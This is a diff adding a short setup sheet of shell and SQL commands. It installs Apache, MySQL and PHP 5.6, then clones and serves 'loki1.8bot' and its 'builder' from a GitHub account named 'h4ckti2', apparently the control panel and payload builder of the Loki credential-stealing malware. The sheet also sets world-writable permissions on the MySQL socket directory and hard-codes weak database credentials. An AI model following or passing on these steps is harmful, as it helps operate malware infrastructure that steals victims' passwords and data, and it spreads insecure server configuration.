@@ -1,0 +1,47 @@
+
+su - root
+cd ~
+sudo apt update
+apt install nano git apache2 mysql-server node npm zip unzip
+sudo apt install software-properties-common ca-certificates lsb-release apt-transport-https 
+add-apt-repository ppa:ondrej/php 
+sudo apt update 
+sudo apt install php5.6 php5.6-mysql php5.6-mcrypt php5.6-gd php5.6-gmp php5.6-json
+____________________
+MYSQL FIX;
+service mysql stop
+service mysql start
+cd /var/run
+chmod 777 mysqld
+cd mysqld && chmod 777 *.*
+cd ~
+____________________
+MYSQL Setup LOKI 1.8;
+mysql -u root -p
+Password;root
+CREATE USER 'lokiadmin'@'127.0.0.1' IDENTIFIED BY 'lokigod';
+GRANT ALL PRIVILEGES ON * . * TO 'lokiadmin'@'127.0.0.1';
+create database lokidb;
+ctrl + D
+__________________
+cd /var/www/html
+git clone https://github.com/h4ckti2/loki1.8bot
+wget https://files.phpmyadmin.net/phpMyAdmin/4.6.0/phpMyAdmin-4.6.0-all-languages.zip
+unzip phpMyAdmin-4.6.0-all-languages.zip
+mv loki1.8bot loki
+mv phpMyAdmin-4.6.0-all-languages phpmyadmin
+___________________
+install Loki Site
+http://host.com/loki/install.php
+mysql user; lokiadmin
+mysql pass; lokigod
+mysql db; lokidb
+login; your
+password panel; your
+________________
+builder
+https://github.com/h4ckti2/builderloki1.8
+
+
+
+
